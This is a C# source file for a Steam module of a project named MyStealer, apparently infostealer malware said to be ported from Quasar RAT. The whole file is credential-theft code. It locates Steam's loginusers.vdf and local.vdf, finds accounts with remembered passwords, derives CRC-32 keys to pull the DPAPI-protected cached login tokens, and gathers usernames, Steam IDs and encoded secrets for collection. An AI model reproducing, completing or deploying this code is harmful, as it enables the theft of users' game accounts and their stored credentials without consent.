using Gameloop.Vdf;
using Gameloop.Vdf.Linq;
using MyStealer.Collector.Utils;
using MyStealer.Utils;
using System;
using System.Collections.Immutable;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace MyStealer.Collector.Modules.Game
{
    /// <summary>
    /// Ported from Quasar RAT
    /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
    /// </summary>
    public class Steam : GameCollector
    {
        public override string ModuleName => "Steam";

        private static readonly string loginUsersVdfPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Steam", "config", "loginusers.vdf");
        private static readonly string localVdfPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf");

        public override bool IsAvailable() => File.Exists(loginUsersVdfPath) && File.Exists(localVdfPath);

        public override IImmutableSet<GameLogin> GetLogins()
        {
            var set = ImmutableHashSet.CreateBuilder<GameLogin>();

            var count = 0;

            var local = VdfConvert.Deserialize(File.ReadAllText(localVdfPath));

            /* local.vdf:
"MachineUserConfigStore"
{
	"Software"
	{
		"Valve"
		{
			"Steam"
			{
				"ConnectCache"
				{
					"<AccountName CRC-32>1"		"<DPAPI Protected Value>"
				}
			}
		}
	}
}
             */
            var connectCache = local.Value; // MachineUserConfigStore
            connectCache = ((VObject)connectCache).Properties().First().Value; // Software
            connectCache = ((VObject)connectCache).Properties().First().Value; // Valve
            connectCache = ((VObject)connectCache).Properties().First().Value; // Steam
            connectCache = ((VObject)connectCache).Properties().First().Value; // ConnectCache

            var loginUsers = VdfConvert.Deserialize(File.ReadAllText(loginUsersVdfPath));
            foreach (var account in loginUsers.Value.Children<VProperty>())
            {
                if (account.Value.Type != VTokenType.Object)
                    continue;

                if (account.Value.Value<int>("RememberPassword") == 1)
                {
                    var steamId = account.Key;
                    var accName = account.Value.Value<string>("AccountName");
                    var hash = new Crc32().Get(Encoding.UTF8.GetBytes(accName)).ToString("x2") + '1';
                    var encryptedValue = connectCache.Value<string>(hash);
                    var password = "";
                    if (encryptedValue != null)
                        // I don't know how to decode it
                        password = Convert.ToBase64String(HexString.HexToBytes(encryptedValue));

                    count++;
                    set.Add(new GameLogin
                    {
                        ProgramName = ModuleName,
                        UserName = accName,
                        Id = steamId,
                        Password = password
                    });
                }
            }

            Logger.Information("Read {count} steam logins.", count);

            return set.ToImmutable();
        }
    }
}
